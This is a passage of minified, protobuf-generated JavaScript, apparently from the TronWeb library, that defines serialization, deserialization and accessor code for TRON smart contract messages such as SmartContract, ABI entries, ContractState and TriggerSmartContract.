        t.DEBUG && !COMPILED && (TronWebProto.SmartContract.displayName = "TronWebProto.SmartContract"),
        TronWebProto.SmartContract.ABI = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.SmartContract.ABI.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.SmartContract.ABI, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SmartContract.ABI.displayName = "TronWebProto.SmartContract.ABI"),
        TronWebProto.SmartContract.ABI.Entry = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.SmartContract.ABI.Entry.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.SmartContract.ABI.Entry, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SmartContract.ABI.Entry.displayName = "TronWebProto.SmartContract.ABI.Entry"),
        TronWebProto.SmartContract.ABI.Entry.Param = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.SmartContract.ABI.Entry.Param, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SmartContract.ABI.Entry.Param.displayName = "TronWebProto.SmartContract.ABI.Entry.Param"),
        TronWebProto.ContractState = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ContractState, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ContractState.displayName = "TronWebProto.ContractState"),
        TronWebProto.CreateSmartContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.CreateSmartContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.CreateSmartContract.displayName = "TronWebProto.CreateSmartContract"),
        TronWebProto.TriggerSmartContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.TriggerSmartContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.TriggerSmartContract.displayName = "TronWebProto.TriggerSmartContract"),
        TronWebProto.ClearABIContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ClearABIContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ClearABIContract.displayName = "TronWebProto.ClearABIContract"),
        TronWebProto.UpdateSettingContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UpdateSettingContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UpdateSettingContract.displayName = "TronWebProto.UpdateSettingContract"),
        TronWebProto.UpdateEnergyLimitContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UpdateEnergyLimitContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UpdateEnergyLimitContract.displayName = "TronWebProto.UpdateEnergyLimitContract"),
        TronWebProto.SmartContractDataWrapper = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.SmartContractDataWrapper, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.SmartContractDataWrapper.displayName = "TronWebProto.SmartContractDataWrapper"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.prototype.toObject = function(n) {
            return TronWebProto.SmartContract.toObject(n, this)
        }
        ,
        TronWebProto.SmartContract.toObject = function(n, s) {
            var a, l = {
                originAddress: s.getOriginAddress_asB64(),
                contractAddress: s.getContractAddress_asB64(),
                abi: (a = s.getAbi()) && TronWebProto.SmartContract.ABI.toObject(n, a),
                bytecode: s.getBytecode_asB64(),
                callValue: e.Message.getFieldWithDefault(s, 5, 0),
                consumeUserResourcePercent: e.Message.getFieldWithDefault(s, 6, 0),
                name: e.Message.getFieldWithDefault(s, 7, ""),
                originEnergyLimit: e.Message.getFieldWithDefault(s, 8, 0),
                codeHash: s.getCodeHash_asB64(),
                trxHash: s.getTrxHash_asB64(),
                version: e.Message.getFieldWithDefault(s, 11, 0)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.SmartContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SmartContract;
            return TronWebProto.SmartContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SmartContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOriginAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setContractAddress(l);
                    break;
                case 3:
                    var l = new TronWebProto.SmartContract.ABI;
                    s.readMessage(l, TronWebProto.SmartContract.ABI.deserializeBinaryFromReader),
                    n.setAbi(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setBytecode(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setCallValue(l);
                    break;
                case 6:
                    var l = s.readInt64();
                    n.setConsumeUserResourcePercent(l);
                    break;
                case 7:
                    var l = s.readString();
                    n.setName(l);
                    break;
                case 8:
                    var l = s.readInt64();
                    n.setOriginEnergyLimit(l);
                    break;
                case 9:
                    var l = s.readBytes();
                    n.setCodeHash(l);
                    break;
                case 10:
                    var l = s.readBytes();
                    n.setTrxHash(l);
                    break;
                case 11:
                    var l = s.readInt32();
                    n.setVersion(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SmartContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SmartContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SmartContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOriginAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getContractAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getAbi(),
            a != null && s.writeMessage(3, a, TronWebProto.SmartContract.ABI.serializeBinaryToWriter),
            a = n.getBytecode_asU8(),
            a.length > 0 && s.writeBytes(4, a),
            a = n.getCallValue(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getConsumeUserResourcePercent(),
            a !== 0 && s.writeInt64(6, a),
            a = n.getName(),
            a.length > 0 && s.writeString(7, a),
            a = n.getOriginEnergyLimit(),
            a !== 0 && s.writeInt64(8, a),
            a = n.getCodeHash_asU8(),
            a.length > 0 && s.writeBytes(9, a),
            a = n.getTrxHash_asU8(),
            a.length > 0 && s.writeBytes(10, a),
            a = n.getVersion(),
            a !== 0 && s.writeInt32(11, a)
        }
        ,
        TronWebProto.SmartContract.ABI.repeatedFields_ = [1],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.prototype.toObject = function(n) {
            return TronWebProto.SmartContract.ABI.toObject(n, this)
        }
        ,
        TronWebProto.SmartContract.ABI.toObject = function(n, s) {
            var a = {
                entrysList: e.Message.toObjectList(s.getEntrysList(), TronWebProto.SmartContract.ABI.Entry.toObject, n)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.SmartContract.ABI.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SmartContract.ABI;
            return TronWebProto.SmartContract.ABI.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SmartContract.ABI.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.SmartContract.ABI.Entry;
                    s.readMessage(l, TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader),
                    n.addEntrys(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SmartContract.ABI.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SmartContract.ABI.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SmartContract.ABI.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getEntrysList(),
            a.length > 0 && s.writeRepeatedMessage(1, a, TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.repeatedFields_ = [4, 5],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.Entry.prototype.toObject = function(n) {
            return TronWebProto.SmartContract.ABI.Entry.toObject(n, this)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.toObject = function(n, s) {
            var a = {
                anonymous: e.Message.getBooleanFieldWithDefault(s, 1, !1),
                constant: e.Message.getBooleanFieldWithDefault(s, 2, !1),
                name: e.Message.getFieldWithDefault(s, 3, ""),
                inputsList: e.Message.toObjectList(s.getInputsList(), TronWebProto.SmartContract.ABI.Entry.Param.toObject, n),
                outputsList: e.Message.toObjectList(s.getOutputsList(), TronWebProto.SmartContract.ABI.Entry.Param.toObject, n),
                type: e.Message.getFieldWithDefault(s, 6, 0),
                payable: e.Message.getBooleanFieldWithDefault(s, 7, !1),
                statemutability: e.Message.getFieldWithDefault(s, 8, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.SmartContract.ABI.Entry.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SmartContract.ABI.Entry;
            return TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBool();
                    n.setAnonymous(l);
                    break;
                case 2:
                    var l = s.readBool();
                    n.setConstant(l);
                    break;
                case 3:
                    var l = s.readString();
                    n.setName(l);
                    break;
                case 4:
                    var l = new TronWebProto.SmartContract.ABI.Entry.Param;
                    s.readMessage(l, TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader),
                    n.addInputs(l);
                    break;
                case 5:
                    var l = new TronWebProto.SmartContract.ABI.Entry.Param;
                    s.readMessage(l, TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader),
                    n.addOutputs(l);
                    break;
                case 6:
                    var l = s.readEnum();
                    n.setType(l);
                    break;
                case 7:
                    var l = s.readBool();
                    n.setPayable(l);
                    break;
                case 8:
                    var l = s.readEnum();
                    n.setStatemutability(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAnonymous(),
            a && s.writeBool(1, a),
            a = n.getConstant(),
            a && s.writeBool(2, a),
            a = n.getName(),
            a.length > 0 && s.writeString(3, a),
            a = n.getInputsList(),
            a.length > 0 && s.writeRepeatedMessage(4, a, TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter),
            a = n.getOutputsList(),
            a.length > 0 && s.writeRepeatedMessage(5, a, TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter),
            a = n.getType(),
            a !== 0 && s.writeEnum(6, a),
            a = n.getPayable(),
            a && s.writeBool(7, a),
            a = n.getStatemutability(),
            a !== 0 && s.writeEnum(8, a)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.EntryType = {
            UNKNOWNENTRYTYPE: 0,
            CONSTRUCTOR: 1,
            FUNCTION: 2,
            EVENT: 3,
            FALLBACK: 4,
            RECEIVE: 5,
            ERROR: 6
        },
        TronWebProto.SmartContract.ABI.Entry.StateMutabilityType = {
            UNKNOWNMUTABILITYTYPE: 0,
            PURE: 1,
            VIEW: 2,
            NONPAYABLE: 3,
            PAYABLE: 4
        },
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.Entry.Param.prototype.toObject = function(n) {
            return TronWebProto.SmartContract.ABI.Entry.Param.toObject(n, this)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.toObject = function(n, s) {
            var a = {
                indexed: e.Message.getBooleanFieldWithDefault(s, 1, !1),
                name: e.Message.getFieldWithDefault(s, 2, ""),
                type: e.Message.getFieldWithDefault(s, 3, "")
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SmartContract.ABI.Entry.Param;
            return TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBool();
                    n.setIndexed(l);
                    break;
                case 2:
                    var l = s.readString();
                    n.setName(l);
                    break;
                case 3:
                    var l = s.readString();
                    n.setType(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getIndexed(),
            a && s.writeBool(1, a),
            a = n.getName(),
            a.length > 0 && s.writeString(2, a),
            a = n.getType(),
            a.length > 0 && s.writeString(3, a)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.getIndexed = function() {
            return e.Message.getBooleanFieldWithDefault(this, 1, !1)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.setIndexed = function(n) {
            return e.Message.setProto3BooleanField(this, 1, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.getName = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.setName = function(n) {
            return e.Message.setProto3StringField(this, 2, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.Param.prototype.setType = function(n) {
            return e.Message.setProto3StringField(this, 3, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getAnonymous = function() {
            return e.Message.getBooleanFieldWithDefault(this, 1, !1)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setAnonymous = function(n) {
            return e.Message.setProto3BooleanField(this, 1, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getConstant = function() {
            return e.Message.getBooleanFieldWithDefault(this, 2, !1)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setConstant = function(n) {
            return e.Message.setProto3BooleanField(this, 2, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getName = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setName = function(n) {
            return e.Message.setProto3StringField(this, 3, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getInputsList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry.Param, 4)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setInputsList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 4, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.addInputs = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 4, n, TronWebProto.SmartContract.ABI.Entry.Param, s)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.clearInputsList = function() {
            return this.setInputsList([])
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getOutputsList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry.Param, 5)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setOutputsList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 5, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.addOutputs = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 5, n, TronWebProto.SmartContract.ABI.Entry.Param, s)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.clearOutputsList = function() {
            return this.setOutputsList([])
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setType = function(n) {
            return e.Message.setProto3EnumField(this, 6, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getPayable = function() {
            return e.Message.getBooleanFieldWithDefault(this, 7, !1)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setPayable = function(n) {
            return e.Message.setProto3BooleanField(this, 7, n)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.getStatemutability = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.SmartContract.ABI.Entry.prototype.setStatemutability = function(n) {
            return e.Message.setProto3EnumField(this, 8, n)
        }
        ,
        TronWebProto.SmartContract.ABI.prototype.getEntrysList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry, 1)
        }
        ,
        TronWebProto.SmartContract.ABI.prototype.setEntrysList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 1, n)
        }
        ,
        TronWebProto.SmartContract.ABI.prototype.addEntrys = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 1, n, TronWebProto.SmartContract.ABI.Entry, s)
        }
        ,
        TronWebProto.SmartContract.ABI.prototype.clearEntrysList = function() {
            return this.setEntrysList([])
        }
        ,
        TronWebProto.SmartContract.prototype.getOriginAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.SmartContract.prototype.getOriginAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOriginAddress())
        }
        ,
        TronWebProto.SmartContract.prototype.getOriginAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOriginAddress())
        }
        ,
        TronWebProto.SmartContract.prototype.setOriginAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getContractAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.SmartContract.prototype.getContractAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractAddress())
        }
        ,
        TronWebProto.SmartContract.prototype.getContractAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractAddress())
        }
        ,
        TronWebProto.SmartContract.prototype.setContractAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getAbi = function() {
            return e.Message.getWrapperField(this, TronWebProto.SmartContract.ABI, 3)
        }
        ,
        TronWebProto.SmartContract.prototype.setAbi = function(n) {
            return e.Message.setWrapperField(this, 3, n)
        }
        ,
        TronWebProto.SmartContract.prototype.clearAbi = function() {
            return this.setAbi(void 0)
        }
        ,
        TronWebProto.SmartContract.prototype.hasAbi = function() {
            return e.Message.getField(this, 3) != null
        }
        ,
        TronWebProto.SmartContract.prototype.getBytecode = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.SmartContract.prototype.getBytecode_asB64 = function() {
            return e.Message.bytesAsB64(this.getBytecode())
        }
        ,
        TronWebProto.SmartContract.prototype.getBytecode_asU8 = function() {
            return e.Message.bytesAsU8(this.getBytecode())
        }
        ,
        TronWebProto.SmartContract.prototype.setBytecode = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getCallValue = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.SmartContract.prototype.setCallValue = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getConsumeUserResourcePercent = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.SmartContract.prototype.setConsumeUserResourcePercent = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getName = function() {
            return e.Message.getFieldWithDefault(this, 7, "")
        }
        ,
        TronWebProto.SmartContract.prototype.setName = function(n) {
            return e.Message.setProto3StringField(this, 7, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getOriginEnergyLimit = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.SmartContract.prototype.setOriginEnergyLimit = function(n) {
            return e.Message.setProto3IntField(this, 8, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getCodeHash = function() {
            return e.Message.getFieldWithDefault(this, 9, "")
        }
        ,
        TronWebProto.SmartContract.prototype.getCodeHash_asB64 = function() {
            return e.Message.bytesAsB64(this.getCodeHash())
        }
        ,
        TronWebProto.SmartContract.prototype.getCodeHash_asU8 = function() {
            return e.Message.bytesAsU8(this.getCodeHash())
        }
        ,
        TronWebProto.SmartContract.prototype.setCodeHash = function(n) {
            return e.Message.setProto3BytesField(this, 9, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getTrxHash = function() {
            return e.Message.getFieldWithDefault(this, 10, "")
        }
        ,
        TronWebProto.SmartContract.prototype.getTrxHash_asB64 = function() {
            return e.Message.bytesAsB64(this.getTrxHash())
        }
        ,
        TronWebProto.SmartContract.prototype.getTrxHash_asU8 = function() {
            return e.Message.bytesAsU8(this.getTrxHash())
        }
        ,
        TronWebProto.SmartContract.prototype.setTrxHash = function(n) {
            return e.Message.setProto3BytesField(this, 10, n)
        }
        ,
        TronWebProto.SmartContract.prototype.getVersion = function() {
            return e.Message.getFieldWithDefault(this, 11, 0)
        }
        ,
        TronWebProto.SmartContract.prototype.setVersion = function(n) {
            return e.Message.setProto3IntField(this, 11, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ContractState.prototype.toObject = function(n) {
            return TronWebProto.ContractState.toObject(n, this)
        }
        ,
        TronWebProto.ContractState.toObject = function(n, s) {
            var a = {
                energyUsage: e.Message.getFieldWithDefault(s, 1, 0),
                energyFactor: e.Message.getFieldWithDefault(s, 2, 0),
                updateCycle: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.ContractState.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.ContractState;
            return TronWebProto.ContractState.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.ContractState.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setEnergyUsage(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setEnergyFactor(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setUpdateCycle(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.ContractState.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.ContractState.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.ContractState.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getEnergyUsage(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getEnergyFactor(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getUpdateCycle(),
            a !== 0 && s.writeInt64(3, a)
        }
        ,
        TronWebProto.ContractState.prototype.getEnergyUsage = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.ContractState.prototype.setEnergyUsage = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.ContractState.prototype.getEnergyFactor = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.ContractState.prototype.setEnergyFactor = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.ContractState.prototype.getUpdateCycle = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.ContractState.prototype.setUpdateCycle = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.CreateSmartContract.prototype.toObject = function(n) {
            return TronWebProto.CreateSmartContract.toObject(n, this)
        }
        ,
        TronWebProto.CreateSmartContract.toObject = function(n, s) {
            var a, l = {
                ownerAddress: s.getOwnerAddress_asB64(),
                newContract: (a = s.getNewContract()) && TronWebProto.SmartContract.toObject(n, a),
                callTokenValue: e.Message.getFieldWithDefault(s, 3, 0),
                tokenId: e.Message.getFieldWithDefault(s, 4, 0)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.CreateSmartContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.CreateSmartContract;
            return TronWebProto.CreateSmartContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.CreateSmartContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = new TronWebProto.SmartContract;
                    s.readMessage(l, TronWebProto.SmartContract.deserializeBinaryFromReader),
                    n.setNewContract(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setCallTokenValue(l);
                    break;
                case 4:
                    var l = s.readInt64();
                    n.setTokenId(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.CreateSmartContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.CreateSmartContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.CreateSmartContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getNewContract(),
            a != null && s.writeMessage(2, a, TronWebProto.SmartContract.serializeBinaryToWriter),
            a = n.getCallTokenValue(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getTokenId(),
            a !== 0 && s.writeInt64(4, a)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.CreateSmartContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getNewContract = function() {
            return e.Message.getWrapperField(this, TronWebProto.SmartContract, 2)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.setNewContract = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.clearNewContract = function() {
            return this.setNewContract(void 0)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.hasNewContract = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getCallTokenValue = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.setCallTokenValue = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.getTokenId = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.CreateSmartContract.prototype.setTokenId = function(n) {
            return e.Message.setProto3IntField(this, 4, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.TriggerSmartContract.prototype.toObject = function(n) {
            return TronWebProto.TriggerSmartContract.toObject(n, this)
        }
        ,
        TronWebProto.TriggerSmartContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                contractAddress: s.getContractAddress_asB64(),
                callValue: e.Message.getFieldWithDefault(s, 3, 0),
                data: s.getData_asB64(),
                callTokenValue: e.Message.getFieldWithDefault(s, 5, 0),
                tokenId: e.Message.getFieldWithDefault(s, 6, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.TriggerSmartContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.TriggerSmartContract;
            return TronWebProto.TriggerSmartContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.TriggerSmartContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setContractAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setCallValue(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setData(l);
                    break;
                case 5:
                    var l = s.readInt64();
                    n.setCallTokenValue(l);
                    break;
                case 6:
                    var l = s.readInt64();
